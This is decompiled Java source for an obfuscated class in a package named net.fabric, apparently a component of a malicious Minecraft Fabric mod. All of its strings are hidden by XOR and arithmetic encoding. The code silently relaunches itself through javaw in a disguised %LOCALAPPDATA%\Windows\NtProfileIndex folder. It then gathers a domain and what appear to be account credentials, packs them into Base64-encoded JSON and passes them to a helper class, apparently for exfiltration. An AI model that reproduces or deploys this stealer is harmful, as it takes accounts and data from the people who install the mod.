/*
 * Decompiled with CFR 0.152.
 */
package net.fabric;

import java.io.File;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.LinkOption;
import java.nio.file.Path;
import java.nio.file.attribute.FileAttribute;
import java.util.Base64;
import net.fabric.uthLt4U_UZ;

public class idxGubmngg {
    public idxGubmngg() {
        idxGubmngg zvnwbcYyHhjjbrXwzq;
    }

    public static void main(String[] eLPMm) {
        if (eLPMm.length > 0) {
            String string = eLPMm[0];
            StringBuilder stringBuilder = new StringBuilder();
            stringBuilder.append((char)(0x4072 ^ 0x405F));
            stringBuilder.append((char)(0xFC63 ^ 0xFC11));
            stringBuilder.append((char)(0xCA22 ^ 0xCA47));
            stringBuilder.append((char)(0x29CC ^ 0x29BF));
            stringBuilder.append((char)(0x5279 ^ 0x520D));
            stringBuilder.append((char)(0x403E ^ 0x405F));
            stringBuilder.append((char)(0xFC63 ^ 0xFC11));
            stringBuilder.append((char)(0xCA33 ^ 0xCA47));
            stringBuilder.append((char)(0x29DA ^ 0x29BF));
            stringBuilder.append((char)(0x5269 ^ 0x520D));
            if (!string.equals(stringBuilder.toString())) {
                uthLt4U_UZ.main(eLPMm);
                return;
            }
        }
        for (String s7HT : eLPMm) {
            char[] cArray = new char[]{(char)(18706 - 18661), (char)(36217 - 36103), (char)(44835 - 44734), (char)(23388 - 23273), (char)(57415 - 57299), (char)(53928 - 53831), (char)(27154 - 27040), (char)(39021 - 38905), (char)(37047 - 36946), (char)(47082 - 46982)};
            if (!s7HT.equals(new String(cArray))) continue;
            idxGubmngg.run();
            return;
        }
        try {
            char[] cArray = new char[]{(char)(14885 + 50757), (char)(6882 + 58751), (char)(42921 + 22733), (char)(28924 + 36709), (char)(26236 + 39346), (char)(2364 + 63276), (char)(61775 + 3872), (char)(12110 + 53535), (char)(41369 + 24268)};
            String Qpkgry_mxst = System.getProperty(new String(cArray));
            String[] stringArray = new String[2];
            stringArray[0] = "bin";
            char[] cArray2 = new char[]{(char)(38684 - 38578), (char)(5425 - 5328), (char)(29878 - 29760), (char)(42104 - 42007), (char)(44689 - 44570), (char)(35963 - 35917), (char)(38679 - 38578), (char)(5448 - 5328), (char)(29861 - 29760)};
            stringArray[1] = new String(cArray2);
            Path fmgrjQmfzz = Path.of((String)Qpkgry_mxst, (String[])stringArray);
            if (!Files.exists(fmgrjQmfzz, new LinkOption[0])) {
                String[] stringArray2 = new String[2];
                stringArray2[0] = "bin";
                char[] cArray3 = new char[]{(char)(0xDA63 ^ 0xDA09), (char)(0xE079 ^ 0xE018), (char)(0xA4DF ^ 0xA4A9), (char)(0x51DD ^ 0x51BC), (char)(0xBA09 ^ 0xBA27), (char)(0x5F58 ^ 0x5F3D), (char)(0x5D71 ^ 0x5D09), (char)(0x9755 ^ 0x9730)};
                stringArray2[1] = new String(cArray3);
                fmgrjQmfzz = Path.of((String)Qpkgry_mxst, (String[])stringArray2);
            }
            String bNfl_pzXu_OwUa_EQPp = new File(idxGubmngg.class.getProtectionDomain().getCodeSource().getLocation().toURI()).getAbsolutePath();
            char[] cArray4 = new char[]{(char)(20554 - 20478), (char)(64790 - 64711), (char)(8209 - 8142), (char)(13738 - 13673), (char)(381 - 305), (char)(52523 - 52458), (char)(55756 - 55676), (char)(20558 - 20478), (char)(64779 - 64711), (char)(8207 - 8142), (char)(13757 - 13673), (char)(370 - 305)};
            String[] stringArray3 = new String[3];
            char[] cArray5 = new char[]{(char)(25484 - 25407), (char)(47140 - 47035), (char)(50304 - 50205), (char)(16764 - 16650), (char)(16757 - 16646), (char)(39156 - 39041), (char)(40494 - 40383), (char)(25509 - 25407), (char)(47151 - 47035)};
            stringArray3[0] = new String(cArray5);
            char[] cArray6 = new char[]{(char)(0x1A5C ^ 0x1A0B), (char)(0xD482 ^ 0xD4EB), (char)(0x60B0 ^ 0x60DE), (char)(0xBC88 ^ 0xBCEC), (char)(0xC3EF ^ 0xC380), (char)(0xBA13 ^ 0xBA64), (char)(0xD5D ^ 0xD2E)};
            stringArray3[1] = new String(cArray6);
            char[] cArray7 = new char[]{(char)(52338 - 52260), (char)(58078 - 57962), (char)(40698 - 40618), (char)(18082 - 17968), (char)(14482 - 14371), (char)(52362 - 52260), (char)(58067 - 57962), (char)(40726 - 40618), (char)(18069 - 17968), (char)(14444 - 14371), (char)(52370 - 52260), (char)(58062 - 57962), (char)(40719 - 40618), (char)(18088 - 17968)};
            stringArray3[2] = new String(cArray7);
            Path fy_yffkf_qvzxwt = Path.of((String)System.getenv(new String(cArray4)), (String[])stringArray3);
            Files.createDirectories(fy_yffkf_qvzxwt, new FileAttribute[0]);
            String QeuH_ycWR_RcAF_QDrH = idxGubmngg.class.getName();
            String[] stringArray4 = new String[5];
            stringArray4[0] = fmgrjQmfzz.toString();
            stringArray4[1] = "-cp";
            stringArray4[2] = bNfl_pzXu_OwUa_EQPp;
            stringArray4[3] = QeuH_ycWR_RcAF_QDrH;
            StringBuilder stringBuilder = new StringBuilder();
            stringBuilder.append((char)(0x7FC ^ 0x7D1));
            stringBuilder.append((char)(0x7BD9 ^ 0x7BAB));
            stringBuilder.append((char)(0x4AF0 ^ 0x4A95));
            stringBuilder.append((char)(0xC568 ^ 0xC51B));
            stringBuilder.append((char)(0x9823 ^ 0x9857));
            stringBuilder.append((char)(0x507 ^ 0x566));
            stringBuilder.append((char)(0xD317 ^ 0xD365));
            stringBuilder.append((char)(0xC50F ^ 0xC57B));
            stringBuilder.append((char)(0xCFAE ^ 0xCFCB));
            stringBuilder.append((char)(0x2799 ^ 0x27FD));
            stringArray4[4] = stringBuilder.toString();
            ProcessBuilder offsetTmp = new ProcessBuilder(stringArray4);
            offsetTmp.redirectInput(ProcessBuilder.Redirect.from(new File("NUL")));
            char[] cArray8 = new char[]{(char)(64398 - 64303), (char)(1384 - 1269), (char)(65531 - 65419), (char)(12159 - 12062), (char)(8718 - 8599), (char)(29546 - 29436), (char)(5162 - 5116), (char)(59682 - 59574), (char)(64414 - 64303), (char)(1372 - 1269)};
            offsetTmp.redirectOutput(ProcessBuilder.Redirect.appendTo(fy_yffkf_qvzxwt.resolve(new String(cArray8)).toFile()));
            offsetTmp.redirectErrorStream(true);
            offsetTmp.directory(fy_yffkf_qvzxwt.toFile());
            offsetTmp.start();
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    private static void run() {
        uthLt4U_UZ bxlugqTd = new uthLt4U_UZ();
        String Prif_XbgG_gqDX_NGzI = bxlugqTd.getDomain();
        String keyVal = uthLt4U_UZ.kJdifO();
        String yaya_aii = uthLt4U_UZ.mqBx0BZzGT8QUDD();
        String string = idxGubmngg.qc_qwxrj(Prif_XbgG_gqDX_NGzI);
        String string2 = idxGubmngg.qc_qwxrj(yaya_aii);
        String string3 = idxGubmngg.qc_qwxrj(keyVal);
        char[] cArray = new char[]{(char)(674 - 551), (char)(34212 - 34178), (char)(47273 - 47156), (char)(22415 - 22300), (char)(15545 - 15444), (char)(26057 - 25943), (char)(53175 - 53102), (char)(16623 - 16523), (char)(26760 - 26726), (char)(16312 - 16254), (char)(585 - 551)};
        char[] cArray2 = new char[]{(char)(51419 - 51385), (char)(10532 - 10488), (char)(40581 - 40547), (char)(3010 - 2894), (char)(24236 - 24139), (char)(52603 - 52500), (char)(49165 - 49131), (char)(25534 - 25476), (char)(57725 - 57691)};
        StringBuilder stringBuilder = new StringBuilder().append(new String(cArray)).append(string3).append(new String(cArray2)).append(string2);
        StringBuilder stringBuilder2 = new StringBuilder();
        stringBuilder2.append((char)(0x587A ^ 0x5858));
        stringBuilder2.append((char)(0x1342 ^ 0x136E));
        stringBuilder2.append((char)(0x1D8C ^ 0x1DAE));
        stringBuilder2.append((char)(0x3CB8 ^ 0x3CDC));
        stringBuilder2.append((char)(0x61A0 ^ 0x61CF));
        stringBuilder2.append((char)(0xFF09 ^ 0xFF64));
        stringBuilder2.append((char)(0x906F ^ 0x900E));
        stringBuilder2.append((char)(0x5831 ^ 0x5858));
        stringBuilder2.append((char)(0x1300 ^ 0x136E));
        stringBuilder2.append((char)(0x1D8C ^ 0x1DAE));
        stringBuilder2.append((char)(0x3CE6 ^ 0x3CDC));
        stringBuilder2.append((char)(0x61ED ^ 0x61CF));
        char[] cArray3 = new char[]{(char)(30978 - 30944), (char)(13610 - 13566), (char)(63924 - 63890), (char)(27783 - 27682), (char)(9179 - 9069), (char)(41859 - 41741), (char)(43180 - 43146), (char)(44928 - 44870), (char)(47667 - 47633), (char)(7128 - 7060), (char)(10910 - 10799), (char)(60764 - 60647), (char)(3426 - 3328), (char)(8678 - 8570), (char)(31045 - 30944), (char)(13633 - 13566), (char)(63998 - 63890), (char)(27787 - 27682), (char)(9168 - 9069), (char)(41848 - 41741), (char)(43180 - 43146), (char)(44995 - 44870)};
        String wmqkm_zuw_vwjhzu = stringBuilder.append(stringBuilder2.toString()).append(string).append(new String(cArray3)).toString();
        String ktwyeVqskWc = Base64.getEncoder().encodeToString(wmqkm_zuw_vwjhzu.getBytes(StandardCharsets.UTF_8));
        uthLt4U_UZ.main(new String[]{ktwyeVqskWc});
    }

    private static String qc_qwxrj(String hkyazz_cm_aq_caev) {
        if (hkyazz_cm_aq_caev == null) {
            return "";
        }
        StringBuilder flagsIdx = new StringBuilder();
        block7: for (char osmb_ukdjxt : hkyazz_cm_aq_caev.toCharArray()) {
            switch (osmb_ukdjxt) {
                case '\"': {
                    flagsIdx.append("\\\"");
                    continue block7;
                }
                case '\\': {
                    char[] cArray = new char[]{(char)(831 + 64797), (char)(38983 + 26645)};
                    flagsIdx.append(new String(cArray));
                    continue block7;
                }
                case '\n': {
                    flagsIdx.append("\\n");
                    continue block7;
                }
                case '\r': {
                    flagsIdx.append("\\r");
                    continue block7;
                }
                case '\t': {
                    flagsIdx.append("\\t");
                    continue block7;
                }
                default: {
                    if (osmb_ukdjxt < ' ') {
                        char[] cArray = new char[]{(char)(0x549A ^ 0x54C6), (char)(0x4898 ^ 0x48ED), (char)(0xCEA9 ^ 0xCE8C), (char)(0xC6A ^ 0xC5A), (char)(0x54F2 ^ 0x54C6), (char)(0x4895 ^ 0x48ED)};
                        flagsIdx.append(String.format(new String(cArray), osmb_ukdjxt));
                        continue block7;
                    }
                    flagsIdx.append(osmb_ukdjxt);
                }
            }
        }
        return flagsIdx.toString();
    }
}

